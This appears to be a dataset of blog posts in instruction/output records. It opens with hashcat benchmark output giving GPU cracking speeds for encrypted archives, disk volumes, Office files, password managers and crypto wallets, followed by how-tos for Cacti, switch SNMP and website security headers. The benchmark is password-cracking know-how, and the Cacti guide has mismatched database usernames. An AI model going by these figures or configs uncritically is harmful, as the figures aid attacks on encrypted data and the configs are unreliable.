808.2 kH/s (65.85ms)\nSpeed.Dev.#*.....:  3148.1 kH/s\n\nHashtype: RAR3-hp\n\nSpeed.Dev.#1.....:    23579 H/s (81.36ms)\nSpeed.Dev.#2.....:    23312 H/s (41.09ms)\nSpeed.Dev.#3.....:    23373 H/s (41.03ms)\nSpeed.Dev.#4.....:    23538 H/s (81.49ms)\nSpeed.Dev.#*.....:    93803 H/s\n\nHashtype: RAR5\n\nSpeed.Dev.#1.....:    26809 H/s (71.51ms)\nSpeed.Dev.#2.....:    25275 H/s (75.67ms)\nSpeed.Dev.#3.....:    26369 H/s (72.71ms)\nSpeed.Dev.#4.....:    27249 H/s (70.33ms)\nSpeed.Dev.#*.....:   105.7 kH/s\n\nHashtype: AxCrypt\n\nSpeed.Dev.#1.....:    86379 H/s (144.98ms)\nSpeed.Dev.#2.....:    84736 H/s (147.72ms)\nSpeed.Dev.#3.....:    84429 H/s (148.33ms)\nSpeed.Dev.#4.....:    87166 H/s (143.66ms)\nSpeed.Dev.#*.....:   342.7 kH/s\n\nHashtype: AxCrypt in-memory SHA1\n\nSpeed.Dev.#1.....:  5618.1 MH/s (89.56ms)\nSpeed.Dev.#2.....:  5106.2 MH/s (98.55ms)\nSpeed.Dev.#3.....:  5525.1 MH/s (90.87ms)\nSpeed.Dev.#4.....:  5684.8 MH/s (88.50ms)\nSpeed.Dev.#*.....: 21934.2 MH/s\n\nHashtype: TrueCrypt PBKDF2-HMAC-RIPEMD160 + XTS 512 bit\n\nSpeed.Dev.#1.....:   200.2 kH/s (72.41ms)\nSpeed.Dev.#2.....:   191.9 kH/s (75.94ms)\nSpeed.Dev.#3.....:   198.0 kH/s (73.60ms)\nSpeed.Dev.#4.....:   203.2 kH/s (71.68ms)\nSpeed.Dev.#*.....:   793.2 kH/s\n\nHashtype: TrueCrypt PBKDF2-HMAC-SHA512 + XTS 512 bit\n\nSpeed.Dev.#1.....:   299.3 kH/s (86.78ms)\nSpeed.Dev.#2.....:   293.6 kH/s (88.58ms)\nSpeed.Dev.#3.....:   294.6 kH/s (88.35ms)\nSpeed.Dev.#4.....:   303.0 kH/s (85.85ms)\nSpeed.Dev.#*.....:  1190.5 kH/s\n\nHashtype: TrueCrypt PBKDF2-HMAC-Whirlpool + XTS 512 bit\n\nSpeed.Dev.#1.....:    26807 H/s (141.85ms)\nSpeed.Dev.#2.....:    26182 H/s (145.24ms)\nSpeed.Dev.#3.....:    26053 H/s (145.95ms)\nSpeed.Dev.#4.....:    27635 H/s (274.05ms)\nSpeed.Dev.#*.....:   106.7 kH/s\n\nHashtype: TrueCrypt PBKDF2-HMAC-RIPEMD160 + XTS 512 bit + boot-mode\n\nSpeed.Dev.#1.....:   384.0 kH/s (66.20ms)\nSpeed.Dev.#2.....:   371.2 kH/s (67.95ms)\nSpeed.Dev.#3.....:   376.6 kH/s (67.50ms)\nSpeed.Dev.#4.....:   386.6 kH/s (65.75ms)\nSpeed.Dev.#*.....:  1518.4 kH/s\n\nHashtype: VeraCrypt PBKDF2-HMAC-RIPEMD160 + XTS 512 bit\n\nSpeed.Dev.#1.....:      618 H/s (73.85ms)\nSpeed.Dev.#2.....:      584 H/s (79.93ms)\nSpeed.Dev.#3.....:      617 H/s (75.36ms)\nSpeed.Dev.#4.....:      623 H/s (73.32ms)\nSpeed.Dev.#*.....:     2442 H/s\n\nHashtype: VeraCrypt PBKDF2-HMAC-SHA512 + XTS 512 bit\n\nSpeed.Dev.#1.....:      643 H/s (97.08ms)\nSpeed.Dev.#2.....:      588 H/s (52.96ms)\nSpeed.Dev.#3.....:      623 H/s (49.97ms)\nSpeed.Dev.#4.....:      652 H/s (95.76ms)\nSpeed.Dev.#*.....:     2506 H/s\n\nHashtype: VeraCrypt PBKDF2-HMAC-Whirlpool + XTS 512 bit\n\nSpeed.Dev.#1.....:       31 H/s (143.21ms)\nSpeed.Dev.#2.....:       30 H/s (145.61ms)\nSpeed.Dev.#3.....:       31 H/s (146.90ms)\nSpeed.Dev.#4.....:       31 H/s (142.59ms)\nSpeed.Dev.#*.....:      123 H/s\n\nHashtype: VeraCrypt PBKDF2-HMAC-RIPEMD160 + XTS 512 bit + boot-mode\n\nSpeed.Dev.#1.....:     1261 H/s (74.19ms)\nSpeed.Dev.#2.....:     1108 H/s (84.80ms)\nSpeed.Dev.#3.....:     1233 H/s (76.77ms)\nSpeed.Dev.#4.....:     1274 H/s (73.42ms)\nSpeed.Dev.#*.....:     4877 H/s\n\nHashtype: VeraCrypt PBKDF2-HMAC-SHA256 + XTS 512 bit\n\nSpeed.Dev.#1.....:      831 H/s (74.11ms)\nSpeed.Dev.#2.....:      778 H/s (80.53ms)\nSpeed.Dev.#3.....:      805 H/s (76.32ms)\nSpeed.Dev.#4.....:      830 H/s (72.96ms)\nSpeed.Dev.#*.....:     3245 H/s\n\nHashtype: VeraCrypt PBKDF2-HMAC-SHA256 + XTS 512 bit + boot-mode\n\nSpeed.Dev.#1.....:     2094 H/s (74.14ms)\nSpeed.Dev.#2.....:     1892 H/s (82.42ms)\nSpeed.Dev.#3.....:     1998 H/s (78.49ms)\nSpeed.Dev.#4.....:     2120 H/s (72.97ms)\nSpeed.Dev.#*.....:     8104 H/s\n\nHashtype: Android FDE <= 4.3\n\nSpeed.Dev.#1.....:   589.1 kH/s (51.39ms)\nSpeed.Dev.#2.....:   543.0 kH/s (56.00ms)\nSpeed.Dev.#3.....:   579.1 kH/s (52.48ms)\nSpeed.Dev.#4.....:   599.0 kH/s (50.73ms)\nSpeed.Dev.#*.....:  2310.2 kH/s\n\nHashtype: Android FDE (Samsung DEK)\n\nSpeed.Dev.#1.....:   213.6 kH/s (71.70ms)\nSpeed.Dev.#2.....:   200.3 kH/s (76.46ms)\nSpeed.Dev.#3.....:   207.0 kH/s (73.99ms)\nSpeed.Dev.#4.....:   217.6 kH/s (70.37ms)\nSpeed.Dev.#*.....:   838.5 kH/s\n\nHashtype: eCryptfs\n\nSpeed.Dev.#1.....:     9713 H/s (98.44ms)\nSpeed.Dev.#2.....:     8813 H/s (53.96ms)\nSpeed.Dev.#3.....:     9270 H/s (51.54ms)\nSpeed.Dev.#4.....:     9932 H/s (96.43ms)\nSpeed.Dev.#*.....:    37728 H/s\n\nHashtype: MS Office <= 2003 $0/$1, MD5 + RC4\n\nSpeed.Dev.#1.....:   169.1 MH/s (93.01ms)\nSpeed.Dev.#2.....:   166.5 MH/s (94.44ms)\nSpeed.Dev.#3.....:   165.0 MH/s (95.31ms)\nSpeed.Dev.#4.....:   169.8 MH/s (92.58ms)\nSpeed.Dev.#*.....:   670.3 MH/s\n\nHashtype: MS Office <= 2003 $0/$1, MD5 + RC4, collider #1\n\nSpeed.Dev.#1.....:   240.1 MH/s (65.48ms)\nSpeed.Dev.#2.....:   236.5 MH/s (66.49ms)\nSpeed.Dev.#3.....:   234.1 MH/s (67.15ms)\nSpeed.Dev.#4.....:   241.0 MH/s (65.22ms)\nSpeed.Dev.#*.....:   951.8 MH/s\n\nHashtype: MS Office <= 2003 $3/$4, SHA1 + RC4\n\nSpeed.Dev.#1.....:   219.8 MH/s (71.52ms)\nSpeed.Dev.#2.....:   216.4 MH/s (72.65ms)\nSpeed.Dev.#3.....:   213.8 MH/s (73.53ms)\nSpeed.Dev.#4.....:   220.8 MH/s (71.18ms)\nSpeed.Dev.#*.....:   870.9 MH/s\n\nHashtype: MS Office <= 2003 $3/$4, SHA1 + RC4, collider #1\n\nSpeed.Dev.#1.....:   250.9 MH/s (62.68ms)\nSpeed.Dev.#2.....:   245.9 MH/s (63.93ms)\nSpeed.Dev.#3.....:   242.7 MH/s (64.78ms)\nSpeed.Dev.#4.....:   250.1 MH/s (62.85ms)\nSpeed.Dev.#*.....:   989.7 MH/s\n\nHashtype: MS Office 2007\n\nSpeed.Dev.#1.....:    95916 H/s (52.35ms)\nSpeed.Dev.#2.....:    90370 H/s (55.63ms)\nSpeed.Dev.#3.....:    93923 H/s (53.51ms)\nSpeed.Dev.#4.....:    97325 H/s (51.65ms)\nSpeed.Dev.#*.....:   377.5 kH/s\n\nHashtype: MS Office 2010\n\nSpeed.Dev.#1.....:    47801 H/s (52.42ms)\nSpeed.Dev.#2.....:    43700 H/s (57.52ms)\nSpeed.Dev.#3.....:    46099 H/s (54.52ms)\nSpeed.Dev.#4.....:    48588 H/s (51.71ms)\nSpeed.Dev.#*.....:   186.2 kH/s\n\nHashtype: MS Office 2013\n\nSpeed.Dev.#1.....:     6422 H/s (97.68ms)\nSpeed.Dev.#2.....:     5903 H/s (53.19ms)\nSpeed.Dev.#3.....:     6171 H/s (50.60ms)\nSpeed.Dev.#4.....:     6523 H/s (96.22ms)\nSpeed.Dev.#*.....:    25019 H/s\n\nHashtype: PDF 1.1 - 1.3 (Acrobat 2 - 4)\n\nSpeed.Dev.#1.....:   250.1 MH/s (62.86ms)\nSpeed.Dev.#2.....:   246.8 MH/s (63.71ms)\nSpeed.Dev.#3.....:   244.7 MH/s (64.25ms)\nSpeed.Dev.#4.....:   252.9 MH/s (62.14ms)\nSpeed.Dev.#*.....:   994.5 MH/s\n\nHashtype: PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1\n\nSpeed.Dev.#1.....:   278.7 MH/s (56.40ms)\nSpeed.Dev.#2.....:   272.9 MH/s (57.61ms)\nSpeed.Dev.#3.....:   270.5 MH/s (58.11ms)\nSpeed.Dev.#4.....:   279.6 MH/s (56.21ms)\nSpeed.Dev.#*.....:  1101.8 MH/s\n\nHashtype: PDF 1.4 - 1.6 (Acrobat 5 - 8)\n\nSpeed.Dev.#1.....: 12029.4 kH/s (39.50ms)\nSpeed.Dev.#2.....: 12173.9 kH/s (39.04ms)\nSpeed.Dev.#3.....: 12081.3 kH/s (39.35ms)\nSpeed.Dev.#4.....: 12464.2 kH/s (38.08ms)\nSpeed.Dev.#*.....: 48748.7 kH/s\n\nHashtype: PDF 1.7 Level 3 (Acrobat 9)\n\nSpeed.Dev.#1.....:  2326.1 MH/s (53.86ms)\nSpeed.Dev.#2.....:  2262.2 MH/s (55.38ms)\nSpeed.Dev.#3.....:  2250.4 MH/s (55.67ms)\nSpeed.Dev.#4.....:  2328.2 MH/s (53.80ms)\nSpeed.Dev.#*.....:  9166.8 MH/s\n\nHashtype: PDF 1.7 Level 8 (Acrobat 10 - 11)\n\nSpeed.Dev.#1.....:    23809 H/s (268.74ms)\nSpeed.Dev.#2.....:    23307 H/s (274.54ms)\nSpeed.Dev.#3.....:    23355 H/s (273.98ms)\nSpeed.Dev.#4.....:    23948 H/s (267.17ms)\nSpeed.Dev.#*.....:    94420 H/s\n\nHashtype: Password Safe v2\n\nSpeed.Dev.#1.....:   231.6 kH/s (42.58ms)\nSpeed.Dev.#2.....:   226.4 kH/s (43.39ms)\nSpeed.Dev.#3.....:   224.9 kH/s (43.69ms)\nSpeed.Dev.#4.....:   229.5 kH/s (42.76ms)\nSpeed.Dev.#*.....:   912.4 kH/s\n\nHashtype: Password Safe v3\n\nSpeed.Dev.#1.....:   892.8 kH/s (62.17ms)\nSpeed.Dev.#2.....:   876.0 kH/s (63.59ms)\nSpeed.Dev.#3.....:   876.5 kH/s (63.56ms)\nSpeed.Dev.#4.....:   904.8 kH/s (61.56ms)\nSpeed.Dev.#*.....:  3550.0 kH/s\n\nHashtype: LastPass + LastPass sniffed\n\nSpeed.Dev.#1.....:  1724.5 kH/s (52.58ms)\nSpeed.Dev.#2.....:  1679.0 kH/s (54.02ms)\nSpeed.Dev.#3.....:  1687.4 kH/s (53.53ms)\nSpeed.Dev.#4.....:  1748.8 kH/s (51.84ms)\nSpeed.Dev.#*.....:  6839.7 kH/s\n\nHashtype: 1Password, agilekeychain\n\nSpeed.Dev.#1.....:  2412.0 kH/s (100.49ms)\nSpeed.Dev.#2.....:  2320.0 kH/s (51.90ms)\nSpeed.Dev.#3.....:  2360.1 kH/s (51.33ms)\nSpeed.Dev.#4.....:  2445.2 kH/s (99.12ms)\nSpeed.Dev.#*.....:  9537.4 kH/s\n\nHashtype: 1Password, cloudkeychain\n\nSpeed.Dev.#1.....:     7999 H/s (97.80ms)\nSpeed.Dev.#2.....:     7527 H/s (52.03ms)\nSpeed.Dev.#3.....:     7775 H/s (50.34ms)\nSpeed.Dev.#4.....:     8106 H/s (96.44ms)\nSpeed.Dev.#*.....:    31406 H/s\n\nHashtype: Bitcoin/Litecoin wallet.dat\n\nSpeed.Dev.#1.....:     3207 H/s (97.75ms)\nSpeed.Dev.#2.....:     2920 H/s (53.46ms)\nSpeed.Dev.#3.....:     3120 H/s (50.00ms)\nSpeed.Dev.#4.....:     3230 H/s (96.70ms)\nSpeed.Dev.#*.....:    12477 H/s\n\nHashtype: Blockchain, My Wallet\n\nSpeed.Dev.#1.....: 52645.7 kH/s (18.18ms)\nSpeed.Dev.#2.....: 49410.2 kH/s (19.66ms)\nSpeed.Dev.#3.....: 50652.6 kH/s (19.45ms)\nSpeed.Dev.#4.....: 51920.0 kH/s (18.79ms)\nSpeed.Dev.#*.....:   204.6 MH/s\n\nHashtype: KeePass 1 (AES/Twofish) and KeePass 2 (AES)\n\nSpeed.Dev.#1.....:   103.0 kH/s (202.72ms)\nSpeed.Dev.#2.....:   100.9 kH/s (206.93ms)\nSpeed.Dev.#3.....:   100.0 kH/s (208.68ms)\nSpeed.Dev.#4.....:   103.3 kH/s (202.13ms)\nSpeed.Dev.#*.....:   407.2 kH/s\n\nHashtype: ArubaOS\n\nSpeed.Dev.#1.....:  4957.8 MH/s (50.19ms)\nSpeed.Dev.#2.....:  4957.7 MH/s (50.74ms)\nSpeed.Dev.#3.....:  4948.6 MH/s (50.83ms)\nSpeed.Dev.#4.....:  5110.6 MH/s (49.21ms)\nSpeed.Dev.#*.....: 19974.8 MH/s\n\nStarted: Fri May 19 13:31:08 2017\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Install Cacti 1.1.10 on Ubuntu 16.04\"\nTaxonomies: \"Author, How-To, Kent Ickler, Cacti, data, go hug a cactus, Kent Ickler, Net Admin, Network monitoring, switches, Ubuntu\"\nCreation Date: \"Wed, 28 Jun 2017 15:43:38 +0000\"\nKent Ickler //\n\nWhat is Cacti?\n\nCacti is a network system that inputs system-generated quantifiable data and presents the data in spiffy graphs.\n\nNet-Admin\n\nIn the Net-Admin world, it gives you time-critical and time-historical data to help you make important decisions. Typical data inputs are things like: switch-port-utilization, environmental information (temperature, humidity, etc.), system criticals: storage space, CPU time, etc.\n\nSecurity-Admin\n\nCombined with SIEM and other system data sources, Cacti can be used to generate security baseline and normalization patterns. It\u2019s also a quick sanity check on the network.\n\nInstalling Ubuntu 16.04\n\nWe are installing from the ISO ubuntu-16.04.2-server-amd64.iso\n\nComplete a the typical setup, however, ensure that the LAMP package is installed during OS install packet selection.\n\nYou will be prompted to create a MySQL root account password. Create the password (don\u2019t leave it blank), keep it handy (you\u2019ll need it soon when working with mysql and mysqladmin) and continue on.\n\nAfter installation, login. Note all those updates we need to do!\n\nUpdate Base System\n\nsudo -s\napt-get update\napt-get upgrade\nreboot -h now\n\nConfigure Network\n\nAfter the updates are completed, setup your network stack. Then reboot.:\n\nsudo -s\nnano /etc/network/interfaces\n\nNotes on nano: CTRL+O to write changes, CTRL+X to close\n\nUpdate your network settings and reboot once more.\n\nreboot -h now \n\nNote on sudo & root\n\nMost of the work done from here on out is done at root since most this work is done within /opt/ and installing bits.\n\nsudo-s\n\nInstall Pre-Reqs\n\nAfter the reboot login once again.\n\nWe have some pre-req\u2019s that need to be installed for Cacti:\n\napt-get install php-xml php-ldap php-mbstring php-gd php-snmp php-gmp rrdtool snmp librrds-perl\n\nDownload Cacti files:\n\nwget http://www.cacti.net/downloads/cacti-1.1.10.tar.gz\ntar xvzf cacti-1.1.10.tar.gz\nmv cacti-1.1.10 /opt/cacti\n\nSetup Log locations\n\nmkdir /opt/logs\ntouch /opt/logs/cacti.log\ntouch /opt/logs/httpd_access.log\ntouch /opt/logs/httpd_error.log\nchown -R www-data /opt/logs/*\n\nConfigure SQL Database\n\n#Create cacti database\n\nmysqladmin --user=root --password create cacti\n###Enter your mysql root password\n\n#Populate the Cacti database\n\nmysql --user root -p cacti < /opt/cacti/cacti.sql\n###Enter your mysql root password\n###This process will take a few minutes, be patient and wait for the prompt to return\n\n#Create Timezone tables in SQL\n\nmysql_tzinfo_to_sql /usr/share/zoneinfo | mysql -u root -p mysql\n###Enter your mysql root password\n\n#Provision access for the cacti database and the timezone database to the cacti user\n\nmysql --user=root --password mysql\n###Enter your mysql root password.\n###This will enter you into the mysql console for mysql database.\n###NOTE: \u2018somepassword\u2019 referenced here is the cacti user password and must be the same as used in cacti configuration in the next section\n\nmysql> GRANT ALL ON cacti.* TO cacti@localhost IDENTIFIED BY 'somepassword';\nmysql> GRANT SELECT ON mysql.time_zone_name TO cacti@localhost IDENTIFIED BY 'somepassword';\n\nExit\n\nConfigure Cacti files:\n\nNote: \u2018somepassword\u2019 referenced here is the cacti database user password specified above.\n\nnano /opt/cacti/include/config.php\n### Find these variables and make the following changes\n\n$database_type = 'mysql';\n$database_default = 'cacti';\n$database_hostname = 'localhost';\n$database_username = 'cactiuser';\n$database_password = somepassword;\n$database_port = '3306';\n$database_ssl = false;\n$url_path = '';\n\nSet File permissions:\n\nNOTE: After setup is completed, the \u201cNeeded for setup\u201d section should be reverted back to your Linux user for security reasons.\n\n#Needed for setup\n\nchown -R www-data:www-data /opt/cacti/resource/snmp_queries\nchown -R www-data:www-data /opt/cacti/resource/script_server\nchown -R www-data:www-data /opt/cacti/resource/script_queries\nchown -R www-data:www-data /opt/cacti/scripts\n\n#Needed always\n\nchown -R www-data:www-data /opt/cacti/rra/ /opt/cacti/log/\nchown -R www-data:www-data /opt/cacti/cache/mibcache\nchown -R www-data:www-data /opt/cacti/cache/realtime\nchown -R www-data:www-data /opt/cacti/cache/spikekill\n\nConfigure Apache\n\ntouch /etc/apache2/sites-available/cacti.conf\nnano /etc/apache2/sites-available/cacti.conf\n\n###Enter the following and save cacti.conf\n\n   \n  require all granted\n  \n\n  ServerAdmin webmaster@localhost\n  DocumentRoot /opt/cacti\n  ErrorLog /opt/logs/httpd_error.log\n  CustomLog /opt/logs/httpd_access.log combined\n\nRemove default/existing site from Apache\n\nrm /etc/apache2/sites-enabled/*\n\nEnable Cacti site in Apache\n\na2ensite cacti.conf\n\nConfigure MySQL\n\nnano /etc/mysql/mysql.conf.d/mysqld.cnf\n\n###Add following lines to the bottom of the configuration file:\n\nMax_heap_table_size = 380M\nTmp_table_size = 64M\nJoin_buffer_size = 64M\nInnodb_doublewrite = OFF\nInnodb_buffer_pool_size = 1899M\nInnodb_flush_log_at_timeout = 3\nInnodb_read_io_threads = 32\nInnodb_write_io_threads = 16\n\nConfigure Poller Crontab\n\nnano /etc/crontab\n\n###Add line at bottom\n\n*/5 * * * * www-data php /opt/cacti/poller.php > /dev/null 2>&1\n\nRestart Services\n\nservice apache2 restart\nservice mysql restart\n\nInitiate web-gui install:\n\nWith all of the pre-req\u2019s done, the web-gui install should go pretty easy. The NEXT button is at the bottom left of each page.\n\nhttp://[your-cacti-ip]\n\nNote: Be sure to update the cacti log path to be /opt/logs/cacti.conf\n\nBe sure to check all of the available templates for install.\n\nDONE! Login!\n\nDefault login for the first time is \n\nUSER: admin \n\nPASSWORD: admin\n\nYou will be prompted to change your password upon first login.\n\n____\n\nCheck out this follow up post about adding an HP ProCurve Switch to Cacti.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Add an HP ProCurve Switch to Cacti via SSH/Telnet/CLI\"\nTaxonomies: \"Author, How-To, Kent Ickler, Cacti, HP ProCurve, Kent Ickler, ProCurve, ProCurve Switch, Switch\"\nCreation Date: \"Wed, 05 Jul 2017 18:55:30 +0000\"\nKent Ickler //\n\nIn my recent post, we installed and got Cacti up and running. Now, we\u2019re going to add our first switch into Cacti\u2019s services.\n\nSwitch:\n\nThis is an HP-Procurve line switch. Because we\u2019re going to configure the switch from the command line the general configuration will apply to multiple models within the ProCurve line. The Web-Interface could also be used. The general configuration necessary is to enable SNMP services on the switch. The SNMP services will be listening on the switch\u2019s management interface/IP. I make the assumption that you already have configured the switch to have an IP address on your (management) network. Additionally, I make the assumption you can access the switch\u2019s CLI via SSH, Telnet, or Serial.\n\nSNMP Strings & SNMPv1 Caution\n\nSNMPv1 allows a simple SNMP query to the SNMP service. These queries are not encrypted, but also are not complicated to setup. We\u2019ll cover V2 and V3 later. Your SNMP *read* string shouldn\u2019t be the default \u201cread\u201d - come up with something more clever. This string is used to authenticate the SNMP agent (cacti) to the SNMP service on the switch to query information. In this example, we are using \u201cSomeReadString\u201d\n\nConfigure SNMP on Switch:\n\nSSH or telnet or serial into the HP Procurve switch\n\nEnable\n\nConfig\n\nSnmp-server community \u201cSomeReadString\u201d\n\nSnmp-server contact \u201cTheAdmin@YourDomain.com\u201d\n\nEnd\n\nWrite Memory\n\nAdd the Device (switch) to Cacti:\n\nLogin to Cacti and click on \u201cDevices\u201d\n\nClick on \u201cAdd\u201d\n\nEnter Description: Name the switch in Cacti\n\nEnter Hostname: The IP of the switch\n\nDevice Template Net-SNMP Device\n\nSNMP Version: 1\n\nSNMP Community: **Your \u201cRead\u201d string from above \u201cSomeReadString\u201d\n\nPress Create at the bottom.\n\nCreate Graphs in Cacti for the Device\n\nAfter pressing create, if everything is configured properly, information for the switch will imediately populate, followed by additional options.\n\nClick on Create Graphs for this Device.\n\nScroll down to the \u201cData Query [SNMP - Interface Statistics]\u201d Section. Select each interface that you would like to graph, or select all of the graphs.\n\nChange the graph type to \u201cIn/Out bytes with Total Bandwidth\u201d Then click on \u201cCreate\u201d at the bottom. There may be a delay after clicking \u201cCreate\u201d.\n\nAdd the Device to the Graphs-Tree\n\nNext, click on \u201cTree\u201d in the left navigation panel. Select press the name \u201cDefault Tree\u201d to enter the management of the Default Tree for graphs.\n\nIn the Edit Tree section, drag the new HPSwitch you created into the \u201cTree Items\u201d column. When dragging the item over, place it directly above or below any existing entries. Then press Save.\n\nNow click on the \u201cGraphs\u201d tab at the top of the screen, followed by the Device you just created.\n\nYou may see some errors as the population of the graphs can take a few moments. Within 10 minutes you begin to see data populate on the graphs.\n\nQuick Bonus:\n\nHP Procurve 1920 GUI SNMP Configuration\n\nLogin to the switch web-GUI, click on \u201cSNMP\u201d under \u201cDevice\u201d\n\nSelect SNMP Enabled, SNMP v1. Save. Then select the community tab and add a new \u201cRead\u201d string for your SNMP service. The remainder follows the above.\n\nLinks:\n\nInstalling Cacti 1.1.10 on Ubuntu 16.04\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How To Fix a Missing Content-Security-Policy on a Website\"\nTaxonomies: \"Author, How-To, Kent Ickler, Content Security Policy, Kent Ickler, Scott Helme, Security Headers, web page, web site, web site configuration\"\nCreation Date: \"Mon, 17 Jul 2017 15:20:19 +0000\"\nKent Ickler //\n\nContent-Security-Policy-What-What?\n\nContent-Security-Policy is a security header that can (and should) be included on communication from your website\u2019s server to a client. When a user goes to your website, headers are used for the client and server to exchange information about the browsing session. This is typically all done in the background unbeknownst to the user. Some of those headers can change the user experience, and some, such as the Content-Security-Policy affect how the web-browser will handle loading certain resources (like CSS files, javascript, images, etc) on the web page.\n\nContent-Security-Policy tells the web-browser what resource locations are trusted by the web-server and is okay to load. If a resource from an untrusted location is added to the webpage by a MiTM or in dynamic code, the browser will know that the resource isn\u2019t trusted and will fail to process that resource.\n\nCheck if you have Content-Security-Policies already enabled\n\nIf you haven\u2019t heard of these headers before, you probably don\u2019t have them enabled. They aren\u2019t automatic. A quick way to check is to go to www.securityheaders.io and do a scan of your website. You can also check in FireFox\u2019s Developer Console.\n\nIdentifying Your Trusted Sources\n\nIn our case, we needed to identify trusted resource sources. This was pretty easy to do with \u201cDeveloper Mode\u201d in FireFox. We loaded our web page, set the Content-Security-Policy, and saw how many errors the console in the Developer Panel created.  Each error was a violation of our Content-Security-Policy. We used that information to include additional sources in our policy until all our content loaded appropriately.\n\nConsult with your web-developers as they may be able to provide you a list of all the source locations that should be trusted.\n\nCreate and Configure the Content-Security-Policy in Apache\n\nThe header we need to add will be added in the httpd.conf file (alternatively, apache.conf, etc.).\n\nIn httpd.conf, find the section for your VirtualHost.\n\nNext, find your section. If it doesn\u2019t exist, you will need to create it and add our specific headers.\n\n~Bits of important stuff here~\n\n    \n\n    RequestHeader set X-HTTPS 1\n\nHeader set Content-Security-Policy \"default-src 'self' 'unsafe-inline' www.blackhillsinfosec.com fonts.googleapis.com;\u201d\n\n~more bits of important stuff~\n\nRestart Apache\n\nSudo service apache restart\n\nTest that change!\n\nWow, looks like we still have some sources we need trust.  Note the sections highlighted\n\nUpdate that Header Set with a Few More Sources\n\nHeader set Content-Security-Policy \"default-src 'self' 'unsafe-inline' www.blackhillsinfosec.com fonts.googleapis.com fonts.static.com www.google-analytics.com;\u201d\n\nDon\u2019t forget to restart Apache after your change.\n\nSoon, you\u2019ll have your page configured properly with Content-Security-Policies and trusted sources. Note the resource errors in the FireFox developer\u2019s console is now clear after refreshing.\n\nHeader Set Content-Security-Policy\n\nScott Helme @Scott_Helme has done a significant amount of research and helped pave the way for web-devs to fully implement Content-Security-Policies. Here is some great content that Scott has put together to assist in the proper implementation of Content-Security-Policies.\n\nContent Security Policy Introduction - Link: https://scotthelme.co.uk/content-security-policy-an-introduction/\n\nContent Security Policy Cheat Sheet - Link: https://scotthelme.co.uk/csp-cheat-sheet/\n\nSoon: Configuring Referral-Policy!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How To Fix a Missing Referrer-Policy on a Website\"\nTaxonomies: \"Author, How-To, Kent Ickler, How to fix a referrer policy, Kent Ickler, Referrer Policy, Scott Helme, Security Headers\"\nCreation Date: \"Wed, 19 Jul 2017 15:37:33 +0000\"\nKent Ickler //\n\nReferrer-Policy, What-What?\n\nReferrer-Policy is a security header that can (and should) be included on communication from your website\u2019s server to a client. The Referrer-Policy tells the web browser how to handle referrer information that is sent to websites when a user clicks a link that leads to another page or website.\n\nThe Referrer-Policy can be configured to cause the browser to not inform the destination site any URL information, some information, or a full URL path. Having a policy set is good practice. The policy can be set a number of ways, including in website code (PHP, etc). Below we will be configuring the Referrer-Policy header in Apache configuration.\n\nCheck If Referrer-Policy Is Enabled\n\nIf you haven\u2019t heard of these headers before, you probably don\u2019t have them enabled. They aren\u2019t automatic, though they may have been included in webapps you\u2019ve installed (WordPress, Joomla, etc.). A quick way to check is to go to www.securityheaders.io and do a scan of your website. You can also check in FireFox\u2019s Developer Console.\n\nIdentifying Your Referrer Needs\n\nWhen a user leaves your website from a link that points elsewhere, it may be useful for the destination server to know where the user came from (your website). It might also be more appropriate that you don\u2019t tell them any information about your website. The referrer header that is sent is typically a string that includes the URL of the page that the user clicked the link to the destination. There are multiple ways to configure if and what information is sent, but things to keep in mind are referrers may be necessary to properly configure web advertisements, analytics, and some authentication platforms. You can also ensure that an HTTPS URL is not leaked into HTTP headers (and consequently leaking website path information unencrypted across the internet).\n\nIn our case, we find the \u201cno-referrer-when-downgrade\u201d policy to meet our needs. This will ensure that if a user clicks a link to an HTTP website (not secure) the web browser will not post our HTTPS URL path (this would be a security data leak, as it discloses our URL path scheme unencrypted across the internet).\n\nSpecific policy options can be found in a link at the bottom of this post.\n\nCreate and configure the Referrer-Policy in Apache\n\nThe header we need to add will be added in the httpd.conf file (alternatively, apache.conf, etc).\n\nIn httpd.conf, find the section for your VirtualHost.\n\nNext, find your section.  If it doesn\u2019t exist, you will need to create it and add our specific headers.\n\n~Bits of important stuff here~\n\n    \n\n    RequestHeader set X-HTTPS 1\n\n         Header set Referrer-Policy \"no-referrer-when-downgrade\"\n\n       \n\n~more bits of important stuff~\n\nRestart Apache\n\nsudo service apache restart\n\nTest the change:\n\nHeader Set Content-Security-Policy\n\nScott Helme has done a significant amount of research and helped pave the way for web devs to fully implement Referrer-Policy. Here is some great content that Scott has put together to assist in proper implementation.\n\nA new security header: Referrer Policy - Link: https://scotthelme.co.uk/a-new-security-header-referrer-policy/\n\nSecurityHeaders.io - Link: https://www.securityheaders.io\n\nRelated:\n\nSee Part 1: How to Configure Content-Security-Policy\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Get into Information Security\"\nTaxonomies: \"InfoSec 101, Career in Infosec, Dreams, How to get into infosec\"\nCreation Date: \"Wed, 26 Jul 2017 14:30:39 +0000\"\nDear BHIS,\n\nSo I\u2019m a big fan of you guys! I took John\u2019s SANS504 OnDemand class and I saw the light. Now what? I want to get into security, (maybe because I want to torture myself) but how? How do I make the next step? How do I get into infosec? Also, are you guys hiring?\n\nTortured\n\nDear Tortured,\n\nNo, sorry, we're not hiring right now, but let's back up to the heart of your question.\n\nInfosec is a fairly new field and we\u2019re still all figuring things out as we go - it truly is the Wild West, full of possibility, danger, and craziness! But you\u2019re on the right track, keep educating yourself. Degrees and certifications are good but there\u2019s lots of education in this industry that\u2019s free, and easily accessible. \n\nIf you\u2019re super serious about wanting to get into information security, go find yourself a job as part of a Blue Team. Try a small shop where you might get to do a little more and have more voice. (1) It might seem like going backward to be doing IT for mom and pop shops, but this is where security is the most vulnerable and you\u2019ll probably realize you know a lot more than you think. Nothing will help the rubber meet the road quite like having a place to try things out, and understand what needs to be fixed. If you\u2019re at a larger place you might not get to be in a role where you make decisions. This will give you a lot of knowledge down the road. If you become a pen tester at some point in your career, having blue team experience will be invaluable to you (and your employer). This is probably a good place to learn to \u201cnetworking\u201d - the foundation of all communications, you can\u2019t hack if you don\u2019t understand TCP/IP/UDP and the fundamentals of switching, routing, ACLs, and sockets. When you learn to blue team, figure out how to break your own work, and then fix it again.\n\nHere are some blogs and other resources 